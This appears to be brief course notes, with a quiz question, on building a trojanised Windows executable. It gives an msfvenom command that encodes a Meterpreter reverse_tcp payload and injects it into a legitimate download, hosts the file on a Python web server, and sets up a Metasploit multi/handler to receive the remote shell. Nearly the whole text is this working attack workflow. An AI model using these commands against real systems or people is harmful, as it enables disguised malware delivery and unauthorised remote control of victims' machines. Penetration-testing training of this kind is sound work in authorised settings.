
Generate Payload with legitimate installation
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip_address> LPORT=<local_port> -e <encoder_name> -i 10 -f exe -x <legitimate_download> > <dir_&_payload_name> 
```

Host files on python server
```
sudo python -m SimpleHTTPServer 80
```

Create multi handler
```
msfconsole 
use exploit/multi/handler
set payload <payload_type>
set LHOSTS <local_ip_address>
set LPORT <local_port>
exploit
```

## Quiz

Which one of the following Msfvenom options can be used to specify a custom executable file for injection?

```
-x <executable_name>
```